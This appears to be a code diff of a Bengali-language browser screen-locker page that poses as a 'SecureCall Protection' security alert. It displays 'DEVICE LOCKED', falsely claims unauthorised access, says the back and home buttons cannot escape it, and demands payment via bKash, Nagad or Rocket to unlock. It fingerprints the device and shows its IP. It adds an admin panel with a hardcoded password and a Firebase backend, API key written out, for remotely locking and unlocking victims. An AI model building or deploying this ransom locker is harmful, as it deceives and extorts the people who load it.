@@ -6,20 +6,16 @@
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="mobile-web-app-capable" content="yes">
-<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
-<meta http-equiv="Pragma" content="no-cache">
-<meta http-equiv="Expires" content="0">
 <title>Security Alert</title>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-<!-- Firebase SDK -->
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
 <style>
-:root{--bg:#040407;--red:#ff0808;--rg:rgba(255,8,8,.45);--cyan:#00e5ff;--gold:#ffa000;--w:#f0f0f0;--g:#777;--dc:rgba(12,12,22,.9);--bd:rgba(255,8,8,.2)}
+:root{--bg:#040407;--red:#ff0808;--rg:rgba(255,8,8,.45);--cyan:#00e5ff;--gold:#ffa000;--w:#f0f0f0;--g:#777;--dc:rgba(12,12,22,.92);--bd:rgba(255,8,8,.2)}
 *{margin:0;padding:0;box-sizing:border-box;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-touch-callout:none;-webkit-tap-highlight-color:transparent}
 html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(--w);font-family:'Share Tech Mono',monospace;touch-action:none}
-#trap{position:fixed;inset:0;z-index:2147483645;background:var(--bg);display:none}
+#trap{position:fixed;inset:0;z-index:2147483644;background:var(--bg);display:none}
 #trap.on{display:block}
 #ls{position:fixed;inset:0;z-index:2147483647;display:flex;flex-direction:column;align-items:center;background:var(--bg);overflow-y:auto;-webkit-overflow-scrolling:touch;touch-action:pan-y;scrollbar-width:none}
 #ls::-webkit-scrollbar{display:none}
@@ -31,69 +27,130 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
 .rfl{position:fixed;inset:0;background:radial-gradient(circle,rgba(255,8,8,.15),transparent 70%);pointer-events:none;z-index:100;opacity:0;transition:opacity .12s}
 .rfl.on{opacity:1}
 .vig{position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,.7)100%);pointer-events:none;z-index:1}
-.lc{position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;gap:13px;padding:28px 16px 50px;width:100%;max-width:440px}
-.lw{position:relative;width:92px;height:92px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.lc{position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;gap:12px;padding:26px 15px 50px;width:100%;max-width:440px}
+.lw{position:relative;width:88px;height:88px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .lw .rn{position:absolute;width:100%;height:100%;border:2px solid var(--red);border-radius:50%;animation:rp 2s ease-in-out infinite}
-.lw .rn:nth-child(2){width:116%;height:116%;animation-delay:.5s;border-color:rgba(255,8,8,.25)}
-.lw .rn:nth-child(3){width:132%;height:132%;animation-delay:1s;border-color:rgba(255,8,8,.08)}
+.lw .rn:nth-child(2){width:115%;height:115%;animation-delay:.5s;border-color:rgba(255,8,8,.25)}
+.lw .rn:nth-child(3){width:130%;height:130%;animation-delay:1s;border-color:rgba(255,8,8,.08)}
 @keyframes rp{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:.4}}
-.lw i{font-size:40px;color:var(--red);filter:drop-shadow(0 0 20px var(--rg));animation:lb 2s ease-in-out infinite}
+.lw i{font-size:38px;color:var(--red);filter:drop-shadow(0 0 20px var(--rg));animation:lb 2s ease-in-out infinite}
 @keyframes lb{0%,100%{transform:translateY(0)}50%{transform:translateY(-4px)}}
-.tt{font-family:'Orbitron',sans-serif;font-size:24px;font-weight:900;color:var(--red);text-transform:uppercase;letter-spacing:4px;text-shadow:0 0 30px var(--rg),0 0 80px rgba(255,8,8,.15);animation:tf 4s ease-in-out infinite;text-align:center}
+.tt{font-family:'Orbitron',sans-serif;font-size:22px;font-weight:900;color:var(--red);text-transform:uppercase;letter-spacing:4px;text-shadow:0 0 30px var(--rg),0 0 80px rgba(255,8,8,.15);animation:tf 4s ease-in-out infinite;text-align:center}
 @keyframes tf{0%,100%{opacity:1}92%{opacity:1}93%{opacity:.3}94%{opacity:1}96%{opacity:.5}97%{opacity:1}}
-.tr{display:flex;align-items:center;gap:7px;font-size:10px;color:var(--g)}
-.tr i{color:var(--red);font-size:12px}.tr .tv{color:var(--w);font-weight:700}
-.wb{width:100%;background:linear-gradient(135deg,rgba(255,8,8,.08),rgba(255,8,8,.02));border:1px solid var(--bd);border-left:3px solid var(--red);border-radius:8px;padding:11px 13px;position:relative;overflow:hidden}
+.tr2{display:flex;align-items:center;gap:6px;font-size:10px;color:var(--g)}
+.tr2 i{color:var(--red);font-size:12px}.tr2 .tv{color:var(--w);font-weight:700}
+.wb{width:100%;background:linear-gradient(135deg,rgba(255,8,8,.08),rgba(255,8,8,.02));border:1px solid var(--bd);border-left:3px solid var(--red);border-radius:8px;padding:10px 12px;position:relative;overflow:hidden}
 .wb::after{content:'';position:absolute;top:0;left:-100%;width:50%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,8,8,.04),transparent);animation:ws 3s ease-in-out infinite}
 @keyframes ws{to{left:150%}}
-.wb p{font-size:10.5px;line-height:1.6;color:#bbb;position:relative;z-index:1}
+.wb p{font-size:10px;line-height:1.6;color:#bbb;position:relative;z-index:1}
 .wb p strong{color:var(--red)}
-.di{width:100%;background:var(--dc);border:1px solid rgba(255,255,255,.04);border-radius:10px;padding:11px 13px;display:flex;flex-direction:column;gap:5px}
-.di .dr{display:flex;justify-content:space-between;font-size:9.5px}
+.di{width:100%;background:var(--dc);border:1px solid rgba(255,255,255,.04);border-radius:10px;padding:10px 12px;display:flex;flex-direction:column;gap:5px}
+.di .dr{display:flex;justify-content:space-between;font-size:9px}
 .di .dr .dl{color:var(--g)}.di .dr .dv{color:var(--cyan)}
-.pc{width:100%;background:linear-gradient(135deg,rgba(255,160,0,.08),rgba(255,160,0,.02));border:1px solid rgba(255,160,0,.25);border-radius:12px;padding:16px;text-align:center;box-shadow:0 0 40px rgba(255,160,0,.04),inset 0 0 40px rgba(255,160,0,.015);animation:pg 2.5s ease-in-out infinite;position:relative;overflow:hidden}
+.pc{width:100%;background:linear-gradient(135deg,rgba(255,160,0,.08),rgba(255,160,0,.02));border:1px solid rgba(255,160,0,.25);border-radius:12px;padding:15px;text-align:center;box-shadow:0 0 40px rgba(255,160,0,.04),inset 0 0 40px rgba(255,160,0,.015);animation:pg 2.5s ease-in-out infinite;position:relative;overflow:hidden}
 @keyframes pg{0%,100%{box-shadow:0 0 40px rgba(255,160,0,.04),inset 0 0 40px rgba(255,160,0,.015)}50%{box-shadow:0 0 60px rgba(255,160,0,.12),inset 0 0 50px rgba(255,160,0,.04)}}
-.pc .ph{display:flex;align-items:center;justify-content:center;gap:7px;font-size:11px;color:var(--gold);font-weight:700;margin-bottom:8px;letter-spacing:1px;text-transform:uppercase}
-.pc .ph i{font-size:15px}
-.pn{font-family:'Orbitron',sans-serif;font-size:24px;font-weight:900;color:var(--gold);letter-spacing:3px;margin:6px 0;text-shadow:0 0 20px rgba(255,160,0,.25)}
-.plb{font-size:10px;color:rgba(255,160,0,.6);margin-bottom:8px;letter-spacing:.5px}
-.cb{background:rgba(255,160,0,.12);border:1px solid rgba(255,160,0,.25);border-radius:8px;color:var(--gold);padding:8px 18px;font-family:'Share Tech Mono',monospace;font-size:11px;cursor:pointer;transition:all .3s;display:inline-flex;align-items:center;gap:6px}
+.pc .ph{display:flex;align-items:center;justify-content:center;gap:7px;font-size:10px;color:var(--gold);font-weight:700;margin-bottom:7px;letter-spacing:1px;text-transform:uppercase}
+.pc .ph i{font-size:14px}
+.pn{font-family:'Orbitron',sans-serif;font-size:22px;font-weight:900;color:var(--gold);letter-spacing:3px;margin:5px 0;text-shadow:0 0 20px rgba(255,160,0,.25)}
+.plb{font-size:9px;color:rgba(255,160,0,.6);margin-bottom:7px}
+.cb{background:rgba(255,160,0,.12);border:1px solid rgba(255,160,0,.25);border-radius:8px;color:var(--gold);padding:7px 16px;font-family:'Share Tech Mono',monospace;font-size:10px;cursor:pointer;transition:all .3s;display:inline-flex;align-items:center;gap:6px}
 .cb:active{transform:scale(.96);background:rgba(255,160,0,.2)}
-.pdv{width:60%;height:1px;background:linear-gradient(90deg,transparent,rgba(255,160,0,.2),transparent);margin:8px auto}
-.pnt{font-size:8.5px;color:#444;margin-top:8px;line-height:1.5}
+.pdv{width:60%;height:1px;background:linear-gradient(90deg,transparent,rgba(255,160,0,.2),transparent);margin:7px auto}
+.pnt{font-size:8px;color:#444;margin-top:7px;line-height:1.5}
 .sp{width:100%;display:flex;flex-direction:column;gap:4px}
-.sp .sr{display:flex;justify-content:space-between;font-size:9.5px}
+.sp .sr{display:flex;justify-content:space-between;font-size:9px}
 .sp .sr .sl{color:var(--g)}.sp .sr .spv{color:var(--cyan)}
 .pt{width:100%;height:3px;background:rgba(255,255,255,.04);border-radius:3px;overflow:hidden}
 .pf{height:100%;width:0%;background:linear-gradient(90deg,var(--cyan),var(--red));border-radius:3px;transition:width .5s;box-shadow:0 0 8px var(--cyan)}
 .tl{width:100%;display:flex;flex-direction:column;gap:4px}
-.ti{display:flex;align-items:center;gap:7px;font-size:9.5px;padding:6px 9px;background:rgba(255,8,8,.04);border-radius:5px;border:1px solid rgba(255,8,8,.07);animation:tin .5s ease-out both}
-.ti i{color:var(--red);font-size:11px;flex-shrink:0}
+.ti{display:flex;align-items:center;gap:7px;font-size:9px;padding:5px 8px;background:rgba(255,8,8,.04);border-radius:5px;border:1px solid rgba(255,8,8,.07);animation:tin .5s ease-out both}
+.ti i{color:var(--red);font-size:10px;flex-shrink:0}
 .ti .tt{color:#aaa;flex:1}
-.ti .ts{color:var(--red);font-weight:700;font-size:8px;text-transform:uppercase;letter-spacing:1px;flex-shrink:0}
+.ti .ts{color:var(--red);font-weight:700;font-size:7.5px;text-transform:uppercase;letter-spacing:1px;flex-shrink:0}
 @keyframes tin{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
-.br{display:flex;align-items:center;gap:7px;margin-top:2px}
-.br .ab{background:linear-gradient(135deg,var(--cyan),#0088aa);color:#000;font-size:7.5px;font-weight:700;padding:3px 8px;border-radius:20px;letter-spacing:1px;text-transform:uppercase;font-family:'Orbitron',sans-serif}
-.br .bt{color:var(--g);font-size:8.5px;letter-spacing:1px}
-.fub{width:100%;padding:12px;background:linear-gradient(135deg,rgba(255,8,8,.1),rgba(255,8,8,.03));border:1px solid var(--bd);border-radius:10px;color:var(--red);font-family:'Orbitron',sans-serif;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:all .3s;text-align:center}
+.br2{display:flex;align-items:center;gap:7px;margin-top:2px}
+.br2 .ab{background:linear-gradient(135deg,var(--cyan),#0088aa);color:#000;font-size:7px;font-weight:700;padding:3px 7px;border-radius:20px;letter-spacing:1px;text-transform:uppercase;font-family:'Orbitron',sans-serif}
+.br2 .bt{color:var(--g);font-size:8px;letter-spacing:1px}
+.fub{width:100%;padding:11px;background:linear-gradient(135deg,rgba(255,8,8,.1),rgba(255,8,8,.03));border:1px solid var(--bd);border-radius:10px;color:var(--red);font-family:'Orbitron',sans-serif;font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:all .3s;text-align:center}
 .fub:active{background:rgba(255,8,8,.15);transform:scale(.98)}
-.toast{position:fixed;bottom:45px;left:50%;transform:translateX(-50%) translateY(80px);padding:9px 20px;border-radius:8px;font-size:10.5px;font-weight:700;z-index:2147483647;opacity:0;transition:all .35s;pointer-events:none;white-space:nowrap}
+.toast{position:fixed;bottom:40px;left:50%;transform:translateX(-50%) translateY(80px);padding:8px 18px;border-radius:8px;font-size:10px;font-weight:700;z-index:2147483647;opacity:0;transition:all .35s;pointer-events:none;white-space:nowrap}
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
-.ft{background:rgba(255,8,8,.95);color:#fff;box-shadow:0 4px 30px rgba(255,8,8,.5)}
-.ct{background:rgba(255,160,0,.95);color:#000;box-shadow:0 4px 30px rgba(255,160,0,.4)}
-#unl{position:fixed;inset:0;background:var(--bg);display:none;flex-direction:column;align-items:center;justify-content:center;z-index:2147483647;gap:18px}
-#unl .ui{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#00c853,#00e676);display:flex;align-items:center;justify-content:center;box-shadow:0 0 50px rgba(0,200,83,.4);animation:up .6s ease-out}
+.ft2{background:rgba(255,8,8,.95);color:#fff;box-shadow:0 4px 30px rgba(255,8,8,.5)}
+.ct2{background:rgba(255,160,0,.95);color:#000;box-shadow:0 4px 30px rgba(255,160,0,.4)}
+#wot{position:fixed;inset:0;background:var(--bg);display:none;flex-direction:column;align-items:center;justify-content:center;z-index:2147483647;gap:16px}
+#wot .ui{width:90px;height:90px;border-radius:50%;background:linear-gradient(135deg,#00c853,#00e676);display:flex;align-items:center;justify-content:center;box-shadow:0 0 50px rgba(0,200,83,.4);animation:up .6s ease-out}
 @keyframes up{0%{transform:scale(0);opacity:0}60%{transform:scale(1.2)}100%{transform:scale(1);opacity:1}}
-#unl .ui i{font-size:44px;color:#fff}
-#unl h2{font-family:'Orbitron',sans-serif;font-size:20px;color:#00e676;letter-spacing:3px}
-#unl p{color:var(--g);font-size:11px}
+#wot .ui i{font-size:40px;color:#fff}
+#wot h2{font-family:'Orbitron',sans-serif;font-size:18px;color:#00e676;letter-spacing:3px}
+#wot p{color:var(--g);font-size:10px}
 #particles{position:fixed;inset:0;pointer-events:none;z-index:1}
 @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-12px)}40%{transform:translateX(10px)}60%{transform:translateX(-8px)}80%{transform:translateX(6px)}}
-@media(max-width:370px){.tt{font-size:19px;letter-spacing:2px}.lw{width:76px;height:76px}.lw i{font-size:34px}.pn{font-size:20px}}
+
+/* অ্যাডমিন */
+#adm{display:none;width:100%;min-height:100vh;background:#08080d;padding:14px;flex-direction:column;gap:13px;overflow-y:auto;-webkit-overflow-scrolling:touch;touch-action:pan-y;user-select:text;-webkit-user-select:text}
+#adm.on{display:flex}
+#adm::-webkit-scrollbar{width:3px}
+#adm::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:3px}
+.ah2{display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(255,255,255,.04)}
+.ah2 h1{font-family:'Orbitron',sans-serif;font-size:14px;color:var(--cyan);letter-spacing:2px}
+.ah2 .asr2{display:flex;align-items:center;gap:5px;font-size:8px;color:#444}
+.ah2 .sd2{width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--rg);animation:dp2 1.5s ease-in-out infinite}
+.ah2 .sd2.off{background:#00e676;box-shadow:0 0 8px rgba(0,230,118,.5)}
+@keyframes dp2{0%,100%{opacity:1}50%{opacity:.35}}
+.al2{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px}
+.al2 .li2{width:65px;height:65px;border-radius:50%;background:rgba(0,229,255,.05);border:2px solid rgba(0,229,255,.12);display:flex;align-items:center;justify-content:center}
+.al2 .li2 i{font-size:26px;color:var(--cyan)}
+.al2 h2{font-family:'Orbitron',sans-serif;font-size:13px;color:var(--w);letter-spacing:2px}
+.al2 input{width:260px;padding:11px 14px;background:rgba(255,255,255,.025);border:1px solid rgba(0,229,255,.12);border-radius:10px;color:var(--w);font-family:'Share Tech Mono',monospace;font-size:13px;text-align:center;outline:none;transition:border-color .3s}
+.al2 input:focus{border-color:var(--cyan);box-shadow:0 0 15px rgba(0,229,255,.06)}
+.al2 .lbn2{width:260px;padding:11px;background:linear-gradient(135deg,var(--cyan),#0088aa);border:none;border-radius:10px;color:#000;font-family:'Orbitron',sans-serif;font-size:10px;font-weight:700;letter-spacing:2px;cursor:pointer;transition:all .3s}
+.al2 .lbn2:active{transform:scale(.97)}
+.al2 .le2{color:var(--red);font-size:10px;min-height:15px}
+.ad2{display:none;flex-direction:column;gap:12px;flex:1}
+.ad2.on{display:flex}
+.sc2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.scc2{background:var(--dc);border:1px solid rgba(255,255,255,.04);border-radius:9px;padding:11px;display:flex;flex-direction:column;gap:3px}
+.scc2 .sl2{font-size:8px;color:var(--g);text-transform:uppercase;letter-spacing:1px}
+.scc2 .sv2{font-family:'Orbitron',sans-serif;font-size:16px;font-weight:700}
+.scc2 .sv2.r{color:var(--red)}.scc2 .sv2.g{color:#00e676}.scc2 .sv2.c{color:var(--cyan)}
+.dlc2{background:var(--dc);border:1px solid rgba(255,255,255,.04);border-radius:11px;padding:12px;display:flex;flex-direction:column;gap:8px}
+.dlc2 h3{font-family:'Orbitron',sans-serif;font-size:9px;color:var(--g);letter-spacing:1px;display:flex;align-items:center;gap:6px}
+.dlc2 h3 .cn2{background:var(--red);color:#fff;font-size:7px;padding:2px 7px;border-radius:10px;font-weight:700}
+.dei2{display:flex;align-items:center;gap:8px;padding:9px 10px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:7px}
+.dei2 .di2{width:32px;height:32px;border-radius:7px;background:rgba(0,229,255,.05);border:1px solid rgba(0,229,255,.1);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.dei2 .di2 i{font-size:12px;color:var(--cyan)}
+.dei2 .df2{flex:1;min-width:0;display:flex;flex-direction:column;gap:2px}
+.dei2 .dm2{font-size:10px;color:var(--w);font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dei2 .dd2{font-size:8px;color:#444;display:flex;gap:5px;flex-wrap:wrap;align-items:center}
+.dei2 .od2{width:5px;height:5px;border-radius:50%;background:#00e676;flex-shrink:0;animation:dp2 1.5s ease-in-out infinite}
+.dei2 .ofd2{width:5px;height:5px;border-radius:50%;background:#333;flex-shrink:0}
+.dei2 .ub2{background:linear-gradient(135deg,#00c853,#00e676);border:none;border-radius:6px;color:#fff;padding:6px 10px;font-family:'Orbitron',sans-serif;font-size:7px;font-weight:700;letter-spacing:1px;cursor:pointer;flex-shrink:0;transition:all .3s;text-transform:uppercase}
+.dei2 .ub2:active{transform:scale(.95)}
+.dei2 .ub2.done{background:#1a1a1a;color:#444;cursor:default;pointer-events:none}
+.ndev2{font-size:9px;color:#333;text-align:center;padding:18px}
+.cc2{background:var(--dc);border:1px solid rgba(255,255,255,.04);border-radius:11px;padding:13px;display:flex;flex-direction:column;gap:9px}
+.cc2 h3{font-family:'Orbitron',sans-serif;font-size:9px;color:var(--w);letter-spacing:1px}
+.sab2{width:100%;padding:12px;background:linear-gradient(135deg,var(--red),#bb0000);border:none;border-radius:9px;color:#fff;font-family:'Orbitron',sans-serif;font-size:11px;font-weight:900;letter-spacing:2px;cursor:pointer;transition:all .3s;box-shadow:0 4px 25px rgba(255,8,8,.2);display:flex;align-items:center;justify-content:center;gap:7px}
+.sab2:active{transform:scale(.97)}
+.sab2:disabled{background:#1a1a1a;color:#333;box-shadow:none;cursor:not-allowed}
+.rab2{width:100%;padding:10px;background:linear-gradient(135deg,var(--cyan),#0088aa);border:none;border-radius:9px;color:#000;font-family:'Orbitron',sans-serif;font-size:9px;font-weight:700;letter-spacing:2px;cursor:pointer;transition:all .3s;display:flex;align-items:center;justify-content:center;gap:7px}
+.rab2:active{transform:scale(.97)}
+.ls2{background:var(--dc);border:1px solid rgba(255,255,255,.04);border-radius:11px;padding:12px;display:flex;flex-direction:column;gap:7px;max-height:280px}
+.ls2 h3{font-family:'Orbitron',sans-serif;font-size:8px;color:var(--g);letter-spacing:1px;flex-shrink:0}
+.ll2{flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:2px}
+.ll2::-webkit-scrollbar{width:2px}
+.ll2::-webkit-scrollbar-thumb{background:rgba(255,255,255,.06);border-radius:2px}
+.le3{font-size:8px;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.015);display:flex;gap:5px}
+.le3 .lt3{color:var(--cyan);white-space:nowrap;flex-shrink:0}
+.le3 .lm3{color:#444;word-break:break-all}
+.le3 .lm3 .mdl2{color:var(--gold);font-size:7px}
+.af2{text-align:center;padding:12px 0;font-size:7px;color:#1a1a1a;letter-spacing:1px}
+@media(max-width:370px){.tt{font-size:18px;letter-spacing:2px}.lw{width:72px;height:72px}.lw i{font-size:32px}.pn{font-size:18px}}
 @media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
 </style>
 </head>
 <body>
+
 <div id="trap"></div>
 <div id="ls">
   <canvas id="particles"></canvas>
@@ -104,312 +161,345 @@ html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:var(
   <div class="lc" id="lcc">
     <div class="lw" id="lwk"><div class="rn"></div><div class="rn"></div><div class="rn"></div><i class="fas fa-lock"></i></div>
     <div class="tt">DEVICE LOCKED</div>
-    <div class="tr"><i class="fas fa-clock"></i><span>লক করা হয়েছে:</span><span class="tv" id="tmr">00:00:00</span></div>
-    <div class="wb"><p><strong><i class="fas fa-exclamation-triangle"></i> সতর্কতা:</strong> আপনার ডিভাইসে অননুমোদিত অ্যাক্সেস সনাক্ত হয়েছে। নিরাপত্তা ঝুঁকি রোধে ডিভাইস লক করা হয়েছে। এই স্ক্রিন বন্ধ করা সম্ভব নয়।</p></div>
+    <div class="tr2"><i class="fas fa-clock"></i><span>লক করা হয়েছে:</span><span class="tv" id="tmr">00:00:00</span></div>
+    <div class="wb"><p><strong><i class="fas fa-exclamation-triangle"></i> সতর্কতা:</strong> আপনার ডিভাইসে অননুমোদিত অ্যাক্সেস সনাক্ত হয়েছে। নিরাপত্তা ঝুঁকি রোধে ডিভাইস লক করা হয়েছে। ব্যাক বাটন, হোম বাটন — কোনো কিছুতেই বের হতে পারবেন না।</p></div>
     <div class="di">
-      <div class="dr"><span class="dl">ডিভাইস মডেল</span><span class="dv" id="dm">Detecting...</span></div>
-      <div class="dr"><span class="dl">প্ল্যাটফর্ম</span><span class="dv" id="dp">--</span></div>
-      <div class="dr"><span class="dl">ব্রাউজার</span><span class="dv" id="db">--</span></div>
-      <div class="dr"><span class="dl">রেজুলেশন</span><span class="dv" id="dsr">--</span></div>
-      <div class="dr"><span class="dl">আইপি ঠিকানা</span><span class="dv" id="dip">Scanning...</span></div>
+      <div class="dr"><span class="dl">ডিভাইস মডেল</span><span class="dv" id="dm2">Detecting...</span></div>
+      <div class="dr"><span class="dl">প্ল্যাটফর্ম</span><span class="dv" id="dp2">--</span></div>
+      <div class="dr"><span class="dl">ব্রাউজার</span><span class="dv" id="db2">--</span></div>
+      <div class="dr"><span class="dl">রেজুলেশন</span><span class="dv" id="dsr2">--</span></div>
+      <div class="dr"><span class="dl">আইপি ঠিকানা</span><span class="dv" id="dip2">Scanning...</span></div>
     </div>
     <div class="pc">
       <div class="ph"><i class="fas fa-shield-halved"></i><span>পেমেন্ট করুন আনলক করতে</span></div>
-      <div class="pn" id="pnd">০১৭XX-XXXXXX</div>
+      <div class="pn" id="pnd2">০১৭XX-XXXXXX</div>
       <div class="plb">bKash / Nagad / Rocket</div>
-      <button class="cb" id="cpb"><i class="fas fa-copy"></i> নাম্বার কপি করুন</button>
+      <button class="cb" id="cpb2"><i class="fas fa-copy"></i> নাম্বার কপি করুন</button>
       <div class="pdv"></div>
       <div class="pnt">পেমেন্ট কনফার্ম হলে অপেক্ষা করুন — অ্যাডমিন ভেরিফিকেশনের পর অটো আনলক</div>
     </div>
     <div class="sp">
-      <div class="sr"><span class="sl"><i class="fas fa-shield-halved"></i> নিরাপত্তা স্ক্যান...</span><span class="spv" id="scp">0%</span></div>
-      <div class="pt"><div class="pf" id="scf"></div></div>
+      <div class="sr"><span class="sl"><i class="fas fa-shield-halved"></i> নিরাপত্তা স্ক্যান...</span><span class="spv" id="scp2">0%</span></div>
+      <div class="pt"><div class="pf" id="scf2"></div></div>
     </div>
-    <div class="tl" id="tlist"></div>
-    <div class="br"><span class="ab">AI-Powered</span><span class="bt">SecureCall Protection v3.7</span></div>
-    <button class="fub" id="fub"><i class="fas fa-unlock"></i>&nbsp; আনলক করুন</button>
+    <div class="tl" id="tlist2"></div>
+    <div class="br2"><span class="ab">AI-Powered</span><span class="bt">SecureCall Protection v3.7</span></div>
+    <button class="fub" id="fub2"><i class="fas fa-unlock"></i>&nbsp; আনলক করুন</button>
   </div>
 </div>
-<div class="toast ft" id="ftst"><i class="fas fa-times-circle"></i>&nbsp; অ্যাক্সেস অস্বীকৃত!</div>
-<div class="toast ct" id="ctst"><i class="fas fa-check-circle"></i>&nbsp; নাম্বার কপি হয়েছে!</div>
-<div id="unl">
+
+<div class="toast ft2" id="ftst2"><i class="fas fa-times-circle"></i>&nbsp; অ্যাক্সেস অস্বীকৃত!</div>
+<div class="toast ct2" id="ctst2"><i class="fas fa-check-circle"></i>&nbsp; নাম্বার কপি হয়েছে!</div>
+
+<div id="wot">
   <div class="ui"><i class="fas fa-lock-open"></i></div>
   <h2>DEVICE UNLOCKED</h2>
   <p>আপনার ডিভাইস সফলভাবে আনলক করা হয়েছে।</p>
-  <p style="color:#222;font-size:9px;margin-top:14px">SecureCall Protection — অ্যাডমিন দ্বারে নিয়ন্ত্রিত</p>
+  <p style="color:#222;font-size:8px;margin-top:12px">SecureCall Protection — অ্যাডমিন দ্বারে নিয়ন্ত্রিত</p>
 </div>
+
+<div id="adm">
+  <div class="ah2"><h1><i class="fas fa-terminal"></i>&nbsp; ADMIN</h1><div class="asr2"><span id="ast2">LOCK ACTIVE</span><div class="sd2" id="adt2"></div></div></div>
+  <div class="al2" id="alogin2">
+    <div class="li2"><i class="fas fa-user-shield"></i></div>
+    <h2>অ্যাডমিন লগইন</h2>
+    <input type="password" id="apin2" placeholder="পাসওয়ার্ড লিখুন" autocomplete="off">
+    <button class="lbn2" id="albn2">ভেরিফাই করুন</button>
+    <div class="le2" id="alerr2"></div>
+  </div>
+  <div class="ad2" id="adash2">
+    <div class="sc2">
+      <div class="scc2"><span class="sl2">স্ট্যাটাস</span><span class="sv2 r" id="ss2">LOCKED</span></div>
+      <div class="scc2"><span class="sl2">সক্রিয় ডিভাইস</span><span class="sv2 r" id="sdv2">0</span></div>
+      <div class="scc2"><span class="sl2">মোট ডিভাইস</span><span class="sv2 c" id="stl2">0</span></div>
+      <div class="scc2"><span class="sl2">আনলক চেষ্টা</span><span class="sv2 r" id="sat2">0</span></div>
+    </div>
+    <div class="dlc2">
+      <h3><i class="fas fa-mobile-screen"></i>&nbsp; লক করা ডিভাইস <span class="cn2" id="dcn2">0</span></h3>
+      <div id="dlc22"><div class="ndev2">লোড হচ্ছে...</div></div>
+    </div>
+    <div class="cc2">
+      <h3><i class="fas fa-sliders"></i>&nbsp; গ্লোবাল কন্ট্রোল</h3>
+      <button class="sab2" id="saBtn2"><i class="fas fa-stop-circle"></i> সব ডিভাইস আনলক করুন</button>
+      <button class="rab2" id="raBtn2" style="display:none"><i class="fas fa-redo"></i> সব ডিভাইস আবার লক করুন</button>
+    </div>
+    <div class="ls2">
+      <h3><i class="fas fa-list-ul"></i>&nbsp; লাইভ অ্যাক্টিভিটি লগ</h3>
+      <div class="ll2" id="llist2"></div>
+    </div>
+  </div>
+  <div class="af2">SecureCall Admin v3.7 — Firebase Realtime</div>
+</div>
+
 <script>
 (function(){
 'use strict';
 
-/* ===== কনফিগারেশন ===== */
+/* ===== কনফিগারেশন — এখানে তোমার তথ্য দাও ===== */
+var ADMIN_PASS='admin123';
 var PAY_NUM='০১৭XX-XXXXXX';
 var PAY_RAW='017XXXXXXXX';
 
-/* ===== Firebase ইনিশিয়ালাইজ ===== */
-var firebaseConfig={
-  apiKey:"AIzaSyBB4om5OumGsXha9xj4WOOeHI4nerhqlV8",
-  authDomain:"earning-app-80258.firebaseapp.com",
-  databaseURL:"https://earning-app-80258-default-rtdb.firebaseio.com",
-  projectId:"earning-app-80258",
-  storageBucket:"earning-app-80258.appspot.com",
-  messagingSenderId:"25930019210",
-  appId:"1:25930019210:web:ca3bf5dd50fb528b631873",
-  measurementId:"G-432VZMDR6Y"
-};
-firebase.initializeApp(firebaseConfig);
+/* ===== Firebase ===== */
+var fc={apiKey:"AIzaSyBB4om5OumGsXha9xj4WOOeHI4nerhqlV8",authDomain:"earning-app-80258.firebaseapp.com",databaseURL:"https://earning-app-80258-default-rtdb.firebaseio.com",projectId:"earning-app-80258",storageBucket:"earning-app-80258.appspot.com",messagingSenderId:"25930019210",appId:"1:25930019210:web:ca3bf5dd50fb528b631873"};
+firebase.initializeApp(fc);
 var db=firebase.database();
 
 /* ===== স্টেট ===== */
-var LA=true,LST=Date.now(),UA=0,SP=0,SD2=1,TC=0;
-var MYID='',MYMD='';
+var LA=true,LST=Date.now(),UA=0,SP=0,SD=1,TC=0,MYID='',MYMD='';
 var tI=null,sI=null,rI=null,hI=null,wL=null;
-var fbLockedRef=null,fbGlobalRef=null,fbDevRef=null;
+var fbLk=null,fbGl=null,fbDev=null;
+var openAttempts=0;
 
-/* ===== ফিঙ্গারপ্রিন্ট ===== */
-function genFP(){
-  var p=[screen.width,screen.height,navigator.platform||'',navigator.language||'',
-    navigator.hardwareConcurrency||0,new Date().getTimezoneOffset(),screen.colorDepth||0,navigator.maxTouchPoints||0];
-  var s=p.join('|'),h=0;
-  for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h=h&h;}
-  return'D'+Math.abs(h).toString(36);
-}
